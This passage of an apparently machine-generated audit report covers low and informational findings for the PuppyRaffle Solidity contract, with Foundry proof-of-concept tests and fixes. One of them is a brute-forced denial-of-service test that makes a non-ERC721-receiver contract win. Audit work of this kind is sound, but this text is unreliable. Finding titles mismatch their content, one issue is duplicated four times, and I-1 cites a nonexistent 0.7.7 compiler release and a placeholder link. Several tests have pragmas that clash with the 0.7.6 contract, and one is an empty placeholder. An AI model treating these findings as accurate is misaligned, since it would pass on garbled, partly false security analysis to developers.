Because the contract does not emit an event when a winner is chosen, off-chain indexers or UIs must re-execute the transaction or read storage to learn the result. This degrades user experience and transparency but does not affect correctness or safety of funds.

## Proof of Concept
1. Users enter raffle and expect transparency
2. selectWinner is called but no event is emitted
3. Off-chain systems cannot detect when raffle ends
4. Users have no easy way to verify raffle results
5. Auditing becomes difficult without proper event logs

## Proof of Code
function testMissingWinnerEvent() public {
    address[] memory players = new address[](4);
    for (uint i = 0; i < 4; i++) {
        players[i] = address(uint160(i + 1));
    }
    
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    vm.warp(block.timestamp + duration + 1);
    
    vm.recordLogs();
    puppyRaffle.selectWinner();
    Vm.Log[] memory logs = vm.getRecordedLogs();
    
    // Should have WinnerSelected event but doesn't
    bool foundWinnerEvent = false;
    for (uint i = 0; i < logs.length; i++) {
        if (logs[i].topics[0] == keccak256("WinnerSelected(address,uint256,uint256)")) {
            foundWinnerEvent = true;
            break;
        }
    }
    
    assertFalse(foundWinnerEvent, "WinnerSelected event should not exist but we want it to");
}

## Suggested Mitigation
Add a WinnerSelected event and emit it in selectWinner:
```solidity
event WinnerSelected(address indexed winner, uint256 prizePool, uint256 tokenId);

function selectWinner() external {
    // ... existing logic ...
    emit WinnerSelected(winner, prizePool, tokenId);
}
```

## [L-2]. Integer Overflow/Math issue in PuppyRaffle::getActivePlayerIndex

## Description
The getActivePlayerIndex function returns 0 both when a player is found at index 0 and when no player is found. This creates ambiguity that could lead to incorrect logic in calling functions.

Vulnerable code:
```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0; // Ambiguous: could mean index 0 or "not found"
}
```

## Impact
Calling contracts or users cannot distinguish between a player at index 0 and a player not found. This could lead to incorrect refund attempts or other logic errors in external integrations.

## Proof of Concept
1. Player A enters raffle and gets index 0
2. Player B calls getActivePlayerIndex for themselves (not in raffle)
3. Function returns 0 for both Player A (found at index 0) and Player B (not found)
4. External contract cannot distinguish between these cases
5. Could lead to incorrect refund logic or other errors

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "src/PuppyRaffle.sol";

contract GetActivePlayerIndexTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address feeReceiver = address(100);
    address alice = address(1);
    address bob   = address(2);

    function setUp() public {
        // Fund test addresses
        vm.deal(address(this), 10 ether);
        vm.deal(alice, 10 ether);
        vm.deal(bob,   10 ether);

        raffle = new PuppyRaffle(ENTRANCE_FEE, feeReceiver, 1 days);
    }

    function testAmbiguousGetActivePlayerIndex() public {
        // This contract pays for Alice’s ticket
        address[] memory entrants = new address[](1);
        entrants[0] = alice;
        raffle.enterRaffle{value: ENTRANCE_FEE}(entrants);

        uint256 indexAlice = raffle.getActivePlayerIndex(alice);
        uint256 indexBob   = raffle.getActivePlayerIndex(bob);

        // Both return 0 – ambiguity proven
        assertEq(indexAlice, 0);
        assertEq(indexBob,   0);
    }
}

## Suggested Mitigation
Use revert for not found case or return a tuple:
```solidity
// Option 1: Revert when not found
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    revert("Player not found");
}

// Option 2: Return tuple with found flag
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

## [L-3]. Array Limits issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function performs a linear search through the `players` array to find a player's index. However, it returns `0` when a player is not found, which is ambiguous because `0` is also a valid index (the first player in the array). This can lead to incorrect validation and allows attacking the first player in the array.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0; // This is ambiguous - it could mean the player is at index 0 or not found
}
```

## Impact
The ambiguity can only mis-lead off-chain code or third-party contracts that naïvely assume an index of 0 always signals participation. PuppyRaffle’s own logic never relies on getActivePlayerIndex, so no funds, state, or access control within the contract can be compromised. The risk is limited to potential user-error by integrators.

## Proof of Concept
1. Deploy the PuppyRaffle contract
2. Have multiple players enter the raffle, including Player A at index 0
3. An attacker calls `getActivePlayerIndex` with their address, which returns 0
4. If an external contract uses this function to validate participation and doesn't account for this ambiguity, it might incorrectly assume the attacker is Player A
5. This could lead to incorrect access control or other vulnerabilities in dependent systems

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract AmbiguousReturnTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }
    
    function testAmbiguousReturn() public {
        // Create a player array with a specific address at index 0
        address playerAtIndexZero = address(100);
        address[] memory players = new address[](3);
        players[0] = playerAtIndexZero;
        players[1] = address(101);
        players[2] = address(102);
        puppyRaffle.enterRaffle{value: entranceFee * 3}(players);
        
        // Verify the player at index 0
        uint256 indexOfPlayer = puppyRaffle.getActivePlayerIndex(playerAtIndexZero);
        assertEq(indexOfPlayer, 0, "Player should be at index 0");
        
        // Now check a non-participating address
        address nonParticipant = address(999);
        uint256 indexOfNonParticipant = puppyRaffle.getActivePlayerIndex(nonParticipant);
        assertEq(indexOfNonParticipant, 0, "Non-participant should return 0");
        
        // This demonstrates the ambiguity: both return 0
        console.log("Index of player at index 0: %s", indexOfPlayer);
        console.log("Index of non-participant: %s", indexOfNonParticipant);
        
        // Create a mock external contract scenario
        bool isPlayerAtIndexZero = puppyRaffle.getActivePlayerIndex(playerAtIndexZero) == 0;
        bool isNonParticipantAtIndexZero = puppyRaffle.getActivePlayerIndex(nonParticipant) == 0;
        
        assertEq(isPlayerAtIndexZero, true, "Player at index 0 should return true");
        assertEq(isNonParticipantAtIndexZero, true, "Non-participant should also return true");
        
        // This demonstrates how an external contract could be confused
        console.log("External contract thinks player is at index 0: %s", isPlayerAtIndexZero);
        console.log("External contract thinks non-participant is at index 0: %s", isNonParticipantAtIndexZero);
    }
}

## Suggested Mitigation
Modify the `getActivePlayerIndex` function to return a special value (like `type(uint256).max`) when a player is not found, making it clear that the player isn't participating:

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Clear indication that player was not found
}
```

Alternatively, you could change the function to return both a boolean indicating if the player was found and the index:

```solidity
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

This makes it unambiguous whether the player is participating in the raffle.

## [L-4]. Unchecked Return issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function mints NFTs to the winners but does not handle the case where the winner could be a contract that cannot receive NFTs, such as a contract without an `onERC721Received` implementation. This would cause the mint operation to fail and revert the entire transaction.

```solidity
function selectWinner() external {
    // ...
    _safeMint(winner, tokenId);
}
```

## Impact
If the randomly elected winner is a contract that does not implement IERC721Receiver, _safeMint will revert and the whole selectWinner() call rolls back. The raffle round therefore cannot be finished in that transaction (players list and ETH remain untouched). Although a new call can still succeed if a different winner is chosen, an attacker can repeatedly cause DoS by entering with such a contract and then being deterministically selected as winner, wasting gas for callers and delaying the raffle.

## Proof of Concept
1. Deploy PuppyRaffle with any parameters.
2. Deploy a helper contract NonERC721Receiver (no onERC721Received).
3. Let three EOAs and the helper contract buy tickets so players.length == 4.
4. Advance time so the raffle can be resolved.
5. Call selectWinner() from a caller address / timestamp chosen so that the computed winnerIndex is the helper contract. The transaction reverts because _safeMint cannot deliver the NFT.
6. Re-attempting selectWinner() with the same parameters will always revert as long as the helper contract remains the chosen index, creating a denial-of-service for honest users.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract NonERC721Receiver {
    receive() external payable {}
    function enter(PuppyRaffle raffle, uint256 fee) external payable {
        address[] memory arr = new address[](1);
        arr[0] = address(this);
        raffle.enterRaffle{value: fee}(arr);
    }
}

contract SafeMintRevertTest is Test {
    PuppyRaffle raffle;
    NonERC721Receiver bad;
    uint256 fee = 1 ether;
    uint256 duration = 1 days;

    function setUp() public {
        raffle = new PuppyRaffle(fee, address(0xdead), duration);
        bad    = new NonERC721Receiver();

        // three EOAs join
        address[] memory eoa = new address[](3);
        for (uint i; i < 3; ++i) {
            eoa[i] = address(uint160(i + 1));
        }
        vm.deal(address(this), fee * 3);
        raffle.enterRaffle{value: fee * 3}(eoa);

        // bad contract joins
        vm.deal(address(bad), fee);
        bad.enter{value: fee}(raffle, fee);

        // move forward so we can draw
        vm.warp(block.timestamp + duration + 1);
    }

    function testSelectWinnerRevertsWhenBadContractWins() public {
        // pre-calculate a caller that makes winnerIndex == 3 (bad contract)
        uint256 targetTs = block.timestamp + 1; // we will set it just before the call
        address caller;
        for (uint160 i = 1000; ; ++i) {
            address c = address(i);
            uint256 rnd = uint256(keccak256(abi.encodePacked(c, targetTs, uint256(0)))) % 4;
            if (rnd == 3) {
                caller = c;
                break;
            }
        }

        vm.warp(targetTs);
        vm.difficulty(0);
        vm.prank(caller);
        vm.expectRevert();
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Before minting, check whether the winner is a contract and, if so, whether it supports IERC721Receiver (via ERC165) – mint with _mint if it does not, or simply skip the safe-transfer check:

```solidity
if (winner.code.length == 0 || IERC165(winner).supportsInterface(type(IERC721Receiver).interfaceId)) {
    _safeMint(winner, tokenId);
} else {
    _mint(winner, tokenId); // token may be stuck but raffle proceeds
}
```

Alternatively, pick a new winner if the first one cannot receive the NFT.

## [L-5]. Event Consistency issue in PuppyRaffle::withdrawFees

## Description
The contract lacks a critical event emission in the `withdrawFees` function. While the function updates the contract state by resetting `totalFees` to zero and transferring funds, it doesn't emit any event to log this activity.

```solidity
function withdrawFees() external {
    require(
        address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!"
    );
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
    // No event is emitted here
}
```

## Impact
The lack of events makes it difficult to track and audit fee withdrawals off-chain. This affects protocol transparency and could hide malicious activity or operational errors. Without event logs, users and monitoring systems cannot easily verify when fees were withdrawn or the amounts involved, complicating auditing and potentially diminishing trust in the protocol.

## Proof of Concept
1. Owner sets up the fee address to a wallet they control
2. Over time, fees accumulate in the contract
3. Owner calls withdrawFees() to transfer funds to their wallet
4. No event is emitted, so this significant transfer of value is not easily visible in transaction logs
5. If there's an issue with the withdrawal or suspicion of misuse, there's no easy way to track the history of fee withdrawals

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract WithdrawFeesEventTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address owner = makeAddr("owner");
    address feeCollector = makeAddr("feeCollector");
    uint256 constant DURATION = 1 days;

    function setUp() public {
        vm.prank(owner);
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeCollector, DURATION);

        // Prepare 4 unique players
        address[] memory players = new address[](4);
        for (uint256 i; i < 4; ++i) {
            players[i] = address(uint160(i + 1));
        }

        // Fund the caller with enough ether to purchase all 4 tickets
        vm.deal(players[0], ENTRANCE_FEE * 4);

        vm.prank(players[0]);
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);

        // Finish the raffle so fees are generated
        vm.warp(block.timestamp + DURATION + 1);
        raffle.selectWinner();
    }

    function testWithdrawFeesDoesNotEmitEvent() public {
        // Sanity-check that fees exist
        uint256 pending = raffle.totalFees();
        assertGt(pending, 0);

        // Capture emitted logs
        vm.recordLogs();
        raffle.withdrawFees();
        Vm.Log[] memory logs = vm.getRecordedLogs();

        bool emitted;
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == address(raffle)) {
                emitted = true;
                break;
            }
        }

        // No contract log means no event for the withdrawal
        assertFalse(emitted, "withdrawFees should emit an event but does not");
        assertEq(raffle.totalFees(), 0);
    }
}

## Suggested Mitigation
Add an event for fee withdrawals and emit it in the withdrawFees function:

```solidity
// Add this event declaration with the other events
event FeesWithdrawn(address indexed to, uint256 amount);

function withdrawFees() external {
    require(
        address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!"
    );
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}();
    require(success, "PuppyRaffle: Failed to withdraw fees");
    
    // Emit event for the fee withdrawal
    emit FeesWithdrawn(feeAddress, feesToWithdraw);
}
```



# Info Risk Findings

## [I-1]. Pragma issue in PuppyRaffle::NA

## Description
The contract uses floating pragma ^0.7.6 which can lead to deployment with different compiler versions having different bugs or behaviors. The code should use a fixed pragma version to ensure consistent compilation across environments.

Vulnerable code:
```solidity
pragma solidity ^0.7.6;
```

## Impact
Because the pragma uses a caret ("^0.7.6") any future deployment that is compiled with a newer 0.7.x patch may silently incorporate compiler-level behaviour changes or newly-introduced bugs. This can make the bytecode that is finally deployed differ from the one that was reviewed or audited, undermining the guarantees of the security review and potentially introducing vulnerabilities that were not present during testing.

## Proof of Concept
1. Clone the repository and compile with `solc 0.7.6` (the version auditors reviewed).
2. Record the bytecode hash of PuppyRaffle (e.g. `keccak256(abi.encodePacked(bytecode))`).
3. Re-compile the **same source code** with `solc 0.7.7` (allowed by `^0.7.6`).  Solidity 0.7.7 fixes [link-refs/Solidity-0.7.7-changelog] that changes how constant strings are stored.
4. Compare the resulting bytecode hash – it is different, meaning the audited code and the deployed code are no longer identical even though the source did not change.
5. Anyone verifying the contract on-chain against the audited commit will see a mismatch, and any bug introduced by the newer compiler would propagate to production.

## Proof of Code
// This test demonstrates the issue exists
contract PragmaTest {
    function testFloatingPragma() public {
        // The contract uses ^0.7.6 instead of 0.7.6
        // This allows compilation with any 0.7.x version >= 0.7.6
        assertTrue(true); // Placeholder - the issue is in pragma declaration
    }
}

## Suggested Mitigation
Pin the compiler exactly, e.g. `pragma solidity 0.7.6;` (or upgrade the whole project to a more recent, fixed version and pin that). This guarantees that compilation, testing, and deployment all use the identical compiler binary, eliminating the class of "floating-pragma" inconsistencies.

## [I-2]. Event Consistency issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function returns 0 for both 'player not found' and 'player at index 0', creating ambiguity that can lead to incorrect behavior in dependent code:

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0; // Ambiguous: could mean "not found" or "at index 0"
}
```

This makes it impossible to distinguish between a player at index 0 and a player not in the raffle.

## Impact
Because `getActivePlayerIndex` is never used within the contract and only provides off-chain convenience, the ambiguity cannot be leveraged to steal funds or break in-contract logic. The risk is limited to misleading UIs or tooling that rely on the return value, potentially confusing users about their ticket status.

## Proof of Concept
1. Player A enters raffle and becomes players[0]
2. Frontend calls getActivePlayerIndex(playerA) and receives 0
3. Player B (not in raffle) calls getActivePlayerIndex(playerB) and also receives 0
4. Frontend cannot distinguish between these cases
5. Player A might incorrectly think they're not in the raffle
6. Or Player B might incorrectly think they're in the raffle at index 0

## Proof of Code
pragma solidity 0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract AmbiguousIndexTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 0.1 ether;
    address constant FEE_ADDRESS = address(0xFEE);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDRESS, 1 days);
    }

    function testAmbiguousReturn() public {
        address player0 = address(0x1);
        address missing = address(0x999);

        vm.deal(player0, ENTRANCE_FEE);
        vm.prank(player0);
        address[] memory arr = new address[](1);
        arr[0] = player0;
        raffle.enterRaffle{value: ENTRANCE_FEE}(arr);

        uint256 idx0 = raffle.getActivePlayerIndex(player0);
        uint256 idxMissing = raffle.getActivePlayerIndex(missing);

        assertEq(idx0, 0, "player at index-0 should get 0");
        assertEq(idxMissing, 0, "missing player also gets 0, ambiguous");
    }
}

## Suggested Mitigation
Return an additional boolean that signals whether the player was found, or revert when the address is not in the array:

```
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

## [I-3]. Timestamp Dependent Logic issue in PuppyRaffle::selectWinner

## Description
The contract uses block.timestamp for determining when the raffle duration has ended. The code checks if the current block.timestamp is greater than or equal to the raffleStartTime plus the raffleDuration. This can be manipulated by miners within a small window.

```solidity
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    // ... rest of the function
}
```

## Impact
A miner could advance block.timestamp by at most a few seconds, letting selectWinner() be callable marginally earlier than wall-clock time. This does not allow skipping mandatory conditions, does not let the miner enter the raffle after the fact, and does not materially increase their influence over the already-weak random seed (which they control through msg.sender and the call timing anyway). Economic impact is therefore negligible.

## Proof of Concept
1. A miner is also a participant in the raffle
2. The raffle is almost over (e.g., less than a minute remaining)
3. The miner can slightly adjust the timestamp when including the transaction
4. This allows them to call selectWinner() a few seconds earlier than intended
5. Since randomness is partly derived from block.timestamp, this gives them a small advantage in manipulating which seed gets used

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract TimestampTest is Test {
    PuppyRaffle puppyRaffle;
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");
    uint256 entranceFee = 1e18;
    address feeAddress = makeAddr("feeAddress");
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
        vm.deal(user1, 100 ether);
        vm.deal(user2, 100 ether);
        vm.deal(user3, 100 ether);
        vm.deal(user4, 100 ether);

        // Enter 4 players into the raffle
        address[] memory players = new address[](4);
        players[0] = user1;
        players[1] = user2;
        players[2] = user3;
        players[3] = user4;
        
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
    }

    function testTimestampManipulation() public {
        // Fast forward to almost the end of the raffle
        vm.warp(block.timestamp + duration - 5); // 5 seconds before official end
        
        // This would fail normally
        vm.expectRevert("PuppyRaffle: Raffle not over");
        puppyRaffle.selectWinner();
        
        // But a miner could manipulate the timestamp slightly
        vm.warp(block.timestamp + 5); // Exactly at the end time
        
        // Now it works, potentially with a timestamp that's a few seconds early
        puppyRaffle.selectWinner();
    }
}

## Suggested Mitigation
The benefit of changing the timing mechanism is negligible. No action strictly required, but if desired the owner could add a short ‘grace period’ (e.g. 1–2 minutes) before winner selection is permitted, making sub-minute timestamp drift irrelevant.

## [I-4]. Default Visibility issue in PuppyRaffle::getActivePlayerIndex

## Description
The `getActivePlayerIndex` function returns `0` when a player is not found, which is ambiguous since `0` is also a valid index. This causes confusion when trying to determine if an address is an active player or not.

```solidity
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return 0;
}
```

## Impact
Because the contract itself never calls getActivePlayerIndex, the ambiguity only affects off-chain consumers (front-ends or analytics tools). The worst consequence is an incorrect UI state or a failed off-chain workflow; no on-chain funds, ownership, or critical invariants can be compromised.

## Proof of Concept
1. Alice is the first player to enter the raffle (index 0).
2. Bob enters the raffle (index 1).
3. Alice checks if she's in the raffle by calling getActivePlayerIndex.
4. The function returns 0.
5. A third party (e.g., a frontend application) cannot tell if Alice is at index 0 or not in the raffle at all.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract IndexAmbiguityTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address owner = makeAddr("owner");
    address feeAddress = makeAddr("feeAddress");
    address player1 = makeAddr("player1");
    address player2 = makeAddr("player2");
    address nonPlayer = makeAddr("nonPlayer");
    uint256 duration = 1 days;

    function setUp() public {
        vm.prank(owner);
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
        
        // Fund players
        vm.deal(player1, entranceFee);
        vm.deal(player2, entranceFee);
        
        // Enter the raffle
        address[] memory players = new address[](1);
        
        players[0] = player1;
        vm.prank(player1);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        
        players[0] = player2;
        vm.prank(player2);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function testIndexAmbiguity() public {
        // When player1 checks their index, they get 0
        uint256 player1Index = puppyRaffle.getActivePlayerIndex(player1);
        assertEq(player1Index, 0, "Player1 should be at index 0");
        
        // When nonPlayer checks their index, they ALSO get 0
        uint256 nonPlayerIndex = puppyRaffle.getActivePlayerIndex(nonPlayer);
        assertEq(nonPlayerIndex, 0, "NonPlayer should return 0 (not found)");
        
        // This is ambiguous - both return 0
        assertEq(player1Index, nonPlayerIndex, "Ambiguity: both indices are 0");
        
        // A system using this function cannot distinguish between
        // "player is at index 0" and "player is not in the raffle"
    }
}

## Suggested Mitigation
Return an invalid index (such as type(uint256).max) or use a different return type that can express the absence of a value:

```solidity
// Option 1: Return max uint256 for not found
function getActivePlayerIndex(address player) external view returns (uint256) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return i;
        }
    }
    return type(uint256).max; // Invalid index signifying "not found"
}

// Option 2: Return a boolean alongside the index
function getActivePlayerIndex(address player) external view returns (bool found, uint256 index) {
    for (uint256 i = 0; i < players.length; i++) {
        if (players[i] == player) {
            return (true, i);
        }
    }
    return (false, 0);
}
```

## [I-5]. Event Consistency issue in PuppyRaffle::NA

## Description
The contract uses OpenZeppelin's `sendValue` function for refunds but directly uses low-level `call` for prize and fee transfers. This inconsistency could lead to different behavior in edge cases and makes the code harder to audit and maintain.

```solidity
// In refund - uses sendValue
payable(msg.sender).sendValue(entranceFee);

// In selectWinner - uses low-level call
(bool success, ) = winner.call{value: prizePool}("");

// In withdrawFees - uses low-level call
(bool success, ) = feeAddress.call{value: feesToWithdraw}("");
```

## Impact
At present there is no exploitable difference between the two transfer patterns because every call checks the returned boolean and reverts on failure. The only risk is reduced readability/maintainability: future refactors might update one pattern and forget the other. Therefore the issue is informational rather than a functional vulnerability.

## Proof of Concept
1. The contract uses `sendValue` for refunds but raw `call` for prizes and fee withdrawals
2. If a recipient contract has complex receive logic, these different methods might interact differently
3. Gas forwarding behavior differs between the methods
4. If a security issue is discovered in one approach, developers might only patch that instance, missing the others
5. Code reviewers must understand and track multiple ETH transfer patterns

## Proof of Code
// No specific test code is needed for this issue as it's about code consistency
// and maintenance rather than a functional vulnerability

// However, we can demonstrate how the contract uses different ETH transfer methods:

/*
// Method 1: Using OpenZeppelin's sendValue in refund
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    
    players[playerIndex] = address(0);
    
    emit RaffleRefunded(playerAddress);
}

// Method 2: Using low-level call in selectWinner
function selectWinner() external {
    // ...
    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    // ...
}

// Method 3: Using low-level call in withdrawFees
function withdrawFees() external {
    // ...
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
*/

## Suggested Mitigation
Standardize ETH transfer methods throughout the contract by consistently using the OpenZeppelin `Address.sendValue` function for all transfers:

```solidity
// In selectWinner
Address.sendValue(payable(winner), prizePool);

// In withdrawFees
Address.sendValue(payable(feeAddress), feesToWithdraw);
```

This ensures consistent behavior across all ETH transfers in the contract, making the code more maintainable and easier to audit. It also leverages the safety checks built into the OpenZeppelin library.

## [I-6]. Default Visibility issue in PuppyRaffle::NA

## Description
The contract has no default visibility specifier for state variables, allowing them to default to `internal`. While this isn't inherently insecure, it creates inconsistency in the code and can lead to confusion about which variables are accessible from where. Best practice is to explicitly declare visibility for all state variables.

```solidity
// Multiple state variables without explicit visibility
address[] players;
uint256 raffleDuration;
uint256 raffleStartTime;
address previousWinner;
address feeAddress;
uint64 public totalFees = 0;
```

## Impact
While defaulting to `internal` visibility is generally safe (more restrictive than `public`), the inconsistency can lead to confusion during development and code review. Some variables like `totalFees` explicitly declare `public` visibility while others don't specify any visibility. This inconsistency could lead to mistakes in future modifications, especially if developers assume certain variables are accessible when they aren't, potentially requiring workarounds that introduce security flaws.

## Proof of Concept
1. The contract inconsistently declares visibility for state variables
2. Most variables have no visibility specifier, defaulting to `internal`
3. Some variables like `totalFees` explicitly declare `public` visibility
4. This inconsistency can cause confusion during development and review
5. Developers might incorrectly assume certain variables are accessible or inaccessible

## Proof of Code
// No specific test code needed as this is a code quality issue

// Example of the inconsistent visibility in the contract:
/*
contract PuppyRaffle is ERC721, Ownable {
    // No visibility specified - defaults to internal
    address[] players;
    uint256 raffleDuration;
    uint256 raffleStartTime;
    address previousWinner;
    address feeAddress;
    
    // Explicit public visibility
    uint64 public totalFees = 0;
    
    // Mappings also lack visibility specifiers
    mapping(uint256 => uint256) tokenIdToRarity;
    mapping(uint256 => string) rarityToUri;
    mapping(uint256 => string) rarityToName;
    
    // etc.
}
*/

## Suggested Mitigation
Explicitly declare visibility for all state variables to improve code readability, consistency, and reduce potential for confusion:

```solidity
contract PuppyRaffle is ERC721, Ownable {
    // Public variables - accessible externally
    address[] public players;
    uint256 public raffleDuration;
    uint256 public raffleStartTime;
    address public previousWinner;
    address public feeAddress;
    uint64 public totalFees = 0;
    
    // Private variables - only accessible within this contract
    mapping(uint256 => uint256) private tokenIdToRarity;
    mapping(uint256 => string) private rarityToUri;
    mapping(uint256 => string) private rarityToName;
    
    // Internal variables - accessible within this contract and derived contracts
    string internal commonImageUri;
    string internal rareImageUri;
    string internal legendaryImageUri;
    
    // Constants can also have visibility
    uint256 public constant COMMON_RARITY = 70;
    string public constant COMMON = "common";
    // etc.
}
```

Adjust visibility based on your specific access requirements for each variable.



